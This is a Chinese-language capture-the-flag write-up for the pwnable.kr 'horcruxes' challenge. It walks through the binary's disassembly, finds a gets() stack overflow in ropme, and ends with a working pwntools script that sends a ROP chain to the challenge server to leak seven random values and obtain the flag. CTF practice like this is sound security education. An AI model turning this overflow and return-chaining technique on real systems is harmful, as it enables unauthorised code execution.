# horcruxes

题目来源：https://pwnable.kr/

这道题的题面提到了 ROP，那么这道题很大概率是使用 ROP 攻击的手段去拿到 flag，但是先不这么早下结论，还是要分析一下代码。可惜的是这道题只给了一个可执行文件，这个比之前给出源码直接分析要提高一些难度，只能通过 objdump 分析汇编代码来反推出控制流。当然也可以使用 ida 的插件来还原 C 的伪代码，这里还是直接看汇编了。由于代码实在有点长，所以只能一部分一部分看：

```asm
0809ff24 <main>:
 809ff24:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 809ff28:	83 e4 f0             	and    $0xfffffff0,%esp
 809ff2b:	ff 71 fc             	pushl  -0x4(%ecx)
 809ff2e:	55                   	push   %ebp
 809ff2f:	89 e5                	mov    %esp,%ebp
 809ff31:	51                   	push   %ecx
 809ff32:	83 ec 14             	sub    $0x14,%esp
 809ff35:	a1 64 20 0a 08       	mov    0x80a2064,%eax
 809ff3a:	6a 00                	push   $0x0
 809ff3c:	6a 02                	push   $0x2
 809ff3e:	6a 00                	push   $0x0
 809ff40:	50                   	push   %eax
 809ff41:	e8 aa fd ff ff       	call   809fcf0 <setvbuf@plt>
 809ff46:	83 c4 10             	add    $0x10,%esp
 809ff49:	a1 60 20 0a 08       	mov    0x80a2060,%eax
 809ff4e:	6a 00                	push   $0x0
 809ff50:	6a 02                	push   $0x2
 809ff52:	6a 00                	push   $0x0
 809ff54:	50                   	push   %eax
 809ff55:	e8 96 fd ff ff       	call   809fcf0 <setvbuf@plt>
 809ff5a:	83 c4 10             	add    $0x10,%esp
 809ff5d:	83 ec 0c             	sub    $0xc,%esp
 809ff60:	6a 3c                	push   $0x3c
 809ff62:	e8 29 fd ff ff       	call   809fc90 <alarm@plt>
 809ff67:	83 c4 10             	add    $0x10,%esp
 809ff6a:	e8 b5 03 00 00       	call   80a0324 <hint>
 809ff6f:	e8 03 02 00 00       	call   80a0177 <init_ABCDEFG>
 809ff74:	83 ec 0c             	sub    $0xc,%esp
 809ff77:	6a 00                	push   $0x0
 809ff79:	e8 a2 fc ff ff       	call   809fc20 <seccomp_init@plt>
 809ff7e:	83 c4 10             	add    $0x10,%esp
 809ff81:	89 45 f4             	mov    %eax,-0xc(%ebp)
 809ff84:	6a 00                	push   $0x0
 809ff86:	68 ad 00 00 00       	push   $0xad
 809ff8b:	68 00 00 ff 7f       	push   $0x7fff0000
 809ff90:	ff 75 f4             	pushl  -0xc(%ebp)
 809ff93:	e8 c8 fc ff ff       	call   809fc60 <seccomp_rule_add@plt>
 809ff98:	83 c4 10             	add    $0x10,%esp
 809ff9b:	6a 00                	push   $0x0
 809ff9d:	6a 05                	push   $0x5
 809ff9f:	68 00 00 ff 7f       	push   $0x7fff0000
 809ffa4:	ff 75 f4             	pushl  -0xc(%ebp)
 809ffa7:	e8 b4 fc ff ff       	call   809fc60 <seccomp_rule_add@plt>
 809ffac:	83 c4 10             	add    $0x10,%esp
 809ffaf:	6a 00                	push   $0x0
 809ffb1:	6a 03                	push   $0x3
 809ffb3:	68 00 00 ff 7f       	push   $0x7fff0000
 809ffb8:	ff 75 f4             	pushl  -0xc(%ebp)
 809ffbb:	e8 a0 fc ff ff       	call   809fc60 <seccomp_rule_add@plt>
 809ffc0:	83 c4 10             	add    $0x10,%esp
 809ffc3:	6a 00                	push   $0x0
 809ffc5:	6a 04                	push   $0x4
 809ffc7:	68 00 00 ff 7f       	push   $0x7fff0000
 809ffcc:	ff 75 f4             	pushl  -0xc(%ebp)
 809ffcf:	e8 8c fc ff ff       	call   809fc60 <seccomp_rule_add@plt>
 809ffd4:	83 c4 10             	add    $0x10,%esp
 809ffd7:	6a 00                	push   $0x0
 809ffd9:	68 fc 00 00 00       	push   $0xfc
 809ffde:	68 00 00 ff 7f       	push   $0x7fff0000
 809ffe3:	ff 75 f4             	pushl  -0xc(%ebp)
 809ffe6:	e8 75 fc ff ff       	call   809fc60 <seccomp_rule_add@plt>
 809ffeb:	83 c4 10             	add    $0x10,%esp
 809ffee:	83 ec 0c             	sub    $0xc,%esp
 809fff1:	ff 75 f4             	pushl  -0xc(%ebp)
 809fff4:	e8 87 fc ff ff       	call   809fc80 <seccomp_load@plt>
 809fff9:	83 c4 10             	add    $0x10,%esp
 809fffc:	e8 08 00 00 00       	call   80a0009 <ropme>
 80a0001:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 80a0004:	c9                   	leave  
 80a0005:	8d 61 fc             	lea    -0x4(%ecx),%esp
 80a0008:	c3 
```

这里只挑重点讲，根据后面的标识也能看出来大致的流程，那么首先进入的第一个比较重要的函数是 init_ABCDEFG，这个函数如下：

```asm
080a0177 <init_ABCDEFG>:
 80a0177:	55                   	push   %ebp
 80a0178:	89 e5                	mov    %esp,%ebp
 80a017a:	83 ec 18             	sub    $0x18,%esp
 80a017d:	83 ec 08             	sub    $0x8,%esp
 80a0180:	6a 00                	push   $0x0
 80a0182:	68 77 05 0a 08       	push   $0x80a0577
 80a0187:	e8 34 fb ff ff       	call   809fcc0 <open@plt>
 80a018c:	83 c4 10             	add    $0x10,%esp
 80a018f:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80a0192:	83 ec 04             	sub    $0x4,%esp
 80a0195:	6a 04                	push   $0x4
 80a0197:	8d 45 f0             	lea    -0x10(%ebp),%eax
 80a019a:	50                   	push   %eax
 80a019b:	ff 75 f4             	pushl  -0xc(%ebp)
 80a019e:	e8 8d fa ff ff       	call   809fc30 <read@plt>
 80a01a3:	83 c4 10             	add    $0x10,%esp
 80a01a6:	83 f8 04             	cmp    $0x4,%eax
 80a01a9:	74 1a                	je     80a01c5 <init_ABCDEFG+0x4e>
 80a01ab:	83 ec 0c             	sub    $0xc,%esp
 80a01ae:	68 84 05 0a 08       	push   $0x80a0584
 80a01b3:	e8 e8 fa ff ff       	call   809fca0 <puts@plt>
 80a01b8:	83 c4 10             	add    $0x10,%esp
 80a01bb:	83 ec 0c             	sub    $0xc,%esp
 80a01be:	6a 00                	push   $0x0
 80a01c0:	e8 eb fa ff ff       	call   809fcb0 <exit@plt>
 80a01c5:	83 ec 0c             	sub    $0xc,%esp
 80a01c8:	ff 75 f4             	pushl  -0xc(%ebp)
 80a01cb:	e8 60 fb ff ff       	call   809fd30 <close@plt>
 80a01d0:	83 c4 10             	add    $0x10,%esp
 80a01d3:	8b 45 f0             	mov    -0x10(%ebp),%eax
 80a01d6:	83 ec 0c             	sub    $0xc,%esp
 80a01d9:	50                   	push   %eax
 80a01da:	e8 f1 fa ff ff       	call   809fcd0 <srand@plt>
 80a01df:	83 c4 10             	add    $0x10,%esp
 80a01e2:	e8 19 fb ff ff       	call   809fd00 <rand@plt>
 80a01e7:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a01ed:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a01f3:	0f 93 c0             	setae  %al
 80a01f6:	0f b6 c0             	movzbl %al,%eax
 80a01f9:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a01ff:	29 c2                	sub    %eax,%edx
 80a0201:	89 d0                	mov    %edx,%eax
 80a0203:	a3 88 20 0a 08       	mov    %eax,0x80a2088
 80a0208:	e8 f3 fa ff ff       	call   809fd00 <rand@plt>
 80a020d:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a0213:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a0219:	0f 93 c0             	setae  %al
 80a021c:	0f b6 c0             	movzbl %al,%eax
 80a021f:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a0225:	29 c2                	sub    %eax,%edx
 80a0227:	89 d0                	mov    %edx,%eax
 80a0229:	a3 70 20 0a 08       	mov    %eax,0x80a2070
 80a022e:	e8 cd fa ff ff       	call   809fd00 <rand@plt>
 80a0233:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a0239:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a023f:	0f 93 c0             	setae  %al
 80a0242:	0f b6 c0             	movzbl %al,%eax
 80a0245:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a024b:	29 c2                	sub    %eax,%edx
 80a024d:	89 d0                	mov    %edx,%eax
 80a024f:	a3 84 20 0a 08       	mov    %eax,0x80a2084
 80a0254:	e8 a7 fa ff ff       	call   809fd00 <rand@plt>
 80a0259:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a025f:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a0265:	0f 93 c0             	setae  %al
 80a0268:	0f b6 c0             	movzbl %al,%eax
 80a026b:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a0271:	29 c2                	sub    %eax,%edx
 80a0273:	89 d0                	mov    %edx,%eax
 80a0275:	a3 6c 20 0a 08       	mov    %eax,0x80a206c
 80a027a:	e8 81 fa ff ff       	call   809fd00 <rand@plt>
 80a027f:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a0285:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a028b:	0f 93 c0             	setae  %al
 80a028e:	0f b6 c0             	movzbl %al,%eax
 80a0291:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a0297:	29 c2                	sub    %eax,%edx
 80a0299:	89 d0                	mov    %edx,%eax
 80a029b:	a3 80 20 0a 08       	mov    %eax,0x80a2080
 80a02a0:	e8 5b fa ff ff       	call   809fd00 <rand@plt>
 80a02a5:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a02ab:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a02b1:	0f 93 c0             	setae  %al
 80a02b4:	0f b6 c0             	movzbl %al,%eax
 80a02b7:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a02bd:	29 c2                	sub    %eax,%edx
 80a02bf:	89 d0                	mov    %edx,%eax
 80a02c1:	a3 74 20 0a 08       	mov    %eax,0x80a2074
 80a02c6:	e8 35 fa ff ff       	call   809fd00 <rand@plt>
 80a02cb:	69 d0 ef be ad de    	imul   $0xdeadbeef,%eax,%edx
 80a02d1:	81 fa be ba fe ca    	cmp    $0xcafebabe,%edx
 80a02d7:	0f 93 c0             	setae  %al
 80a02da:	0f b6 c0             	movzbl %al,%eax
 80a02dd:	69 c0 be ba fe ca    	imul   $0xcafebabe,%eax,%eax
 80a02e3:	29 c2                	sub    %eax,%edx
 80a02e5:	89 d0                	mov    %edx,%eax
 80a02e7:	a3 7c 20 0a 08       	mov    %eax,0x80a207c
 80a02ec:	8b 15 88 20 0a 08    	mov    0x80a2088,%edx
 80a02f2:	a1 70 20 0a 08       	mov    0x80a2070,%eax
 80a02f7:	01 c2                	add    %eax,%edx
 80a02f9:	a1 84 20 0a 08       	mov    0x80a2084,%eax
 80a02fe:	01 c2                	add    %eax,%edx
 80a0300:	a1 6c 20 0a 08       	mov    0x80a206c,%eax
 80a0305:	01 c2                	add    %eax,%edx
 80a0307:	a1 80 20 0a 08       	mov    0x80a2080,%eax
 80a030c:	01 c2                	add    %eax,%edx
 80a030e:	a1 74 20 0a 08       	mov    0x80a2074,%eax
 80a0313:	01 c2                	add    %eax,%edx
 80a0315:	a1 7c 20 0a 08       	mov    0x80a207c,%eax
 80a031a:	01 d0                	add    %edx,%eax
 80a031c:	a3 78 20 0a 08       	mov    %eax,0x80a2078
 80a0321:	90                   	nop
 80a0322:	c9                   	leave  
 80a0323:	c3                   	ret    

```

这个函数看起来是很复杂的，但是实际上做的都是重复的事情，首先它去 open 了一个文件，经过 gdb 中的观察发现就是 /dev/urandom，这个之前就遇到过是用来产生随机数的一个文件。接下去这段代码重复七次做了同一件事就是定义一个变量 tmp_i = 0xdeadbeef * rand() % 0xcafebabe，随后在最后将这七个数累加了起来就是最后的答案。当然连同答案的 8 个数都被存放了起来留作后用。

退回到 main 函数中，跳过一些没有任何意义的函数，下一个非常重要的函数就是 ropme 了，听名字就知道这是解题用的关键的函数：

```asm
080a0009 <ropme>:
 80a0009:	55                   	push   %ebp
 80a000a:	89 e5                	mov    %esp,%ebp
 80a000c:	83 ec 78             	sub    $0x78,%esp
 80a000f:	83 ec 0c             	sub    $0xc,%esp
 80a0012:	68 0c 05 0a 08       	push   $0x80a050c
 80a0017:	e8 24 fc ff ff       	call   809fc40 <printf@plt>
 80a001c:	83 c4 10             	add    $0x10,%esp
 80a001f:	83 ec 08             	sub    $0x8,%esp
 80a0022:	8d 45 f0             	lea    -0x10(%ebp),%eax
 80a0025:	50                   	push   %eax
 80a0026:	68 19 05 0a 08       	push   $0x80a0519
 80a002b:	e8 e0 fc ff ff       	call   809fd10 <__isoc99_scanf@plt>
 80a0030:	83 c4 10             	add    $0x10,%esp
 80a0033:	e8 38 fc ff ff       	call   809fc70 <getchar@plt>
 80a0038:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a003b:	a1 88 20 0a 08       	mov    0x80a2088,%eax
 80a0040:	39 c2                	cmp    %eax,%edx
 80a0042:	75 0a                	jne    80a004e <ropme+0x45>
 80a0044:	e8 02 fe ff ff       	call   809fe4b <A>
 80a0049:	e9 22 01 00 00       	jmp    80a0170 <ropme+0x167>
 80a004e:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a0051:	a1 70 20 0a 08       	mov    0x80a2070,%eax
 80a0056:	39 c2                	cmp    %eax,%edx
 80a0058:	75 0a                	jne    80a0064 <ropme+0x5b>
 80a005a:	e8 0b fe ff ff       	call   809fe6a <B>
 80a005f:	e9 0c 01 00 00       	jmp    80a0170 <ropme+0x167>
 80a0064:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a0067:	a1 84 20 0a 08       	mov    0x80a2084,%eax
 80a006c:	39 c2                	cmp    %eax,%edx
 80a006e:	75 0a                	jne    80a007a <ropme+0x71>
 80a0070:	e8 14 fe ff ff       	call   809fe89 <C>
 80a0075:	e9 f6 00 00 00       	jmp    80a0170 <ropme+0x167>
 80a007a:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a007d:	a1 6c 20 0a 08       	mov    0x80a206c,%eax
 80a0082:	39 c2                	cmp    %eax,%edx
 80a0084:	75 0a                	jne    80a0090 <ropme+0x87>
 80a0086:	e8 1d fe ff ff       	call   809fea8 <D>
 80a008b:	e9 e0 00 00 00       	jmp    80a0170 <ropme+0x167>
 80a0090:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a0093:	a1 80 20 0a 08       	mov    0x80a2080,%eax
 80a0098:	39 c2                	cmp    %eax,%edx
 80a009a:	75 0a                	jne    80a00a6 <ropme+0x9d>
 80a009c:	e8 26 fe ff ff       	call   809fec7 <E>
 80a00a1:	e9 ca 00 00 00       	jmp    80a0170 <ropme+0x167>
 80a00a6:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a00a9:	a1 74 20 0a 08       	mov    0x80a2074,%eax
 80a00ae:	39 c2                	cmp    %eax,%edx
 80a00b0:	75 0a                	jne    80a00bc <ropme+0xb3>
 80a00b2:	e8 2f fe ff ff       	call   809fee6 <F>
 80a00b7:	e9 b4 00 00 00       	jmp    80a0170 <ropme+0x167>
 80a00bc:	8b 55 f0             	mov    -0x10(%ebp),%edx
 80a00bf:	a1 7c 20 0a 08       	mov    0x80a207c,%eax
 80a00c4:	39 c2                	cmp    %eax,%edx
 80a00c6:	75 0a                	jne    80a00d2 <ropme+0xc9>
 80a00c8:	e8 38 fe ff ff       	call   809ff05 <G>
 80a00cd:	e9 9e 00 00 00       	jmp    80a0170 <ropme+0x167>
 80a00d2:	83 ec 0c             	sub    $0xc,%esp
 80a00d5:	68 1c 05 0a 08       	push   $0x80a051c
 80a00da:	e8 61 fb ff ff       	call   809fc40 <printf@plt>
 80a00df:	83 c4 10             	add    $0x10,%esp
 80a00e2:	83 ec 0c             	sub    $0xc,%esp
 80a00e5:	8d 45 8c             	lea    -0x74(%ebp),%eax
 80a00e8:	50                   	push   %eax
 80a00e9:	e8 62 fb ff ff       	call   809fc50 <gets@plt>
 80a00ee:	83 c4 10             	add    $0x10,%esp
 80a00f1:	83 ec 0c             	sub    $0xc,%esp
 80a00f4:	8d 45 8c             	lea    -0x74(%ebp),%eax
 80a00f7:	50                   	push   %eax
 80a00f8:	e8 23 fc ff ff       	call   809fd20 <atoi@plt>
 80a00fd:	83 c4 10             	add    $0x10,%esp
 80a0100:	89 c2                	mov    %eax,%edx
 80a0102:	a1 78 20 0a 08       	mov    0x80a2078,%eax
 80a0107:	39 c2                	cmp    %eax,%edx
 80a0109:	75 55                	jne    80a0160 <ropme+0x157>
 80a010b:	83 ec 08             	sub    $0x8,%esp
 80a010e:	6a 00                	push   $0x0
 80a0110:	68 3c 05 0a 08       	push   $0x80a053c
 80a0115:	e8 a6 fb ff ff       	call   809fcc0 <open@plt>
 80a011a:	83 c4 10             	add    $0x10,%esp
 80a011d:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80a0120:	83 ec 04             	sub    $0x4,%esp
 80a0123:	6a 64                	push   $0x64
 80a0125:	8d 45 8c             	lea    -0x74(%ebp),%eax
 80a0128:	50                   	push   %eax
 80a0129:	ff 75 f4             	pushl  -0xc(%ebp)
 80a012c:	e8 ff fa ff ff       	call   809fc30 <read@plt>
 80a0131:	83 c4 10             	add    $0x10,%esp
 80a0134:	c6 44 05 8c 00       	movb   $0x0,-0x74(%ebp,%eax,1)
 80a0139:	83 ec 0c             	sub    $0xc,%esp
 80a013c:	8d 45 8c             	lea    -0x74(%ebp),%eax
 80a013f:	50                   	push   %eax
 80a0140:	e8 5b fb ff ff       	call   809fca0 <puts@plt>
 80a0145:	83 c4 10             	add    $0x10,%esp
 80a0148:	83 ec 0c             	sub    $0xc,%esp
 80a014b:	ff 75 f4             	pushl  -0xc(%ebp)
 80a014e:	e8 dd fb ff ff       	call   809fd30 <close@plt>
 80a0153:	83 c4 10             	add    $0x10,%esp
 80a0156:	83 ec 0c             	sub    $0xc,%esp
 80a0159:	6a 00                	push   $0x0
 80a015b:	e8 50 fb ff ff       	call   809fcb0 <exit@plt>
 80a0160:	83 ec 0c             	sub    $0xc,%esp
 80a0163:	68 44 05 0a 08       	push   $0x80a0544
 80a0168:	e8 33 fb ff ff       	call   809fca0 <puts@plt>
 80a016d:	83 c4 10             	add    $0x10,%esp
 80a0170:	b8 00 00 00 00       	mov    $0x0,%eax
 80a0175:	c9                   	leave  
 80a0176:	c3                   	ret 
```

同样很长，但是也有很多重复的部分。首先需要用户输入一个数(scanf 函数)，然后这个数要和之前随机出来的七个数比较，如果相等就会触发 ABCDEFG 中的相应的某一个函数，否则就直接跳转到 0x80a00d2。这里是让用户输入最终的结果的地方，按照整个程序的流程判断，这里的输入会和 7 个数累加出来的值进行比较，如果相等就拿到了 flag，否则就失败。

这里看到了 gets 函数就说明最终的输入处就是能够构造缓冲区溢出的位置。仔细查看发现是从 ebp - 0x74 的位置开始输入数据，换句话说填充 0x78 个字符可以到达返回地址处，也就是要被覆盖的位置。

这道题虽说已经告诉大家用 ROP 来攻击，但是一个最单纯的想法是可不可以直接覆盖到打开 flag 文件的地方。这是我最初的想法，所以写了一个脚本让它直接返回到了地址 0x80a010b 处，可惜最后是不行的，**原因在于 gets 函数会将 0x0a 看作是结束符号，恰巧这个地址中就有。**(事实上就算能跳转可能也不能执行，因为这个文件开启了 NX 保护)现在来先观察一下 ABCDEFG 函数在干嘛，如果通过了某一层比较，比如触发了 A 函数：

```asm
0809fe4b <A>:
 809fe4b:	55                   	push   %ebp
 809fe4c:	89 e5                	mov    %esp,%ebp
 809fe4e:	83 ec 08             	sub    $0x8,%esp
 809fe51:	a1 88 20 0a 08       	mov    0x80a2088,%eax
 809fe56:	83 ec 08             	sub    $0x8,%esp
 809fe59:	50                   	push   %eax
 809fe5a:	68 d0 03 0a 08       	push   $0x80a03d0
 809fe5f:	e8 dc fd ff ff       	call   809fc40 <printf@plt>
 809fe64:	83 c4 10             	add    $0x10,%esp
 809fe67:	90                   	nop
 809fe68:	c9                   	leave  
 809fe69:	c3                   	ret 
```

有意思的是 A 函数就是打印出了第一个随机数的值，看了 BCDEFG 函数其实做的都是这个。一个想法就产生了，如果可以在程序中将 ABCDEFG 都执行过后，获得这 7 个随机数，也就能计算出最终的答案。那么然后呢？只要再执行一次 ropme 函数，将答案输入，也就成功了。那么我们只需要在返回地址开始处，堆叠 ABCDEFG 以及 ropme 函数的地址，这些地址可以由 objdump 得到，这道题就成功地解出来了，脚本如下：

```python
from pwn import *                                                 
import time                                                               

conn = remote("pwnable.kr", 9032)                         
conn.recvuntil('Select Menu:')                            
conn.sendline("1")                                                                                                                                         
str1 = "a" * 0x78 + p32(0x809fe4b) + p32(0x809fe6a) + p32(0x809fe89) + p32(0x809fea8) + p32(0x809fec7) + p32(0x809fee6) 
str1 += p32(0x809ff05) + p32(0x809fffc)             
conn.recvuntil('earned? : ')                    
conn.sendline(str1)                                               
n = 0                                                                   
for i in range(7):                                                  
	s = conn.recvuntil('EXP +')                                        
	if i==0:                                                        
		continue                                                        
	s = s.split(')')[0]                                                  
	n += int(s)                                                             
s = conn.recvuntil('Select Menu:')                                           
s = s.split(')')[0]                                                          
n += int(s)                                                                
print n                                                      
conn.sendline('1')                                   
print conn.recvuntil('earned? : ')                  
conn.sendline(str(n))                                                   
print conn.recv()
```

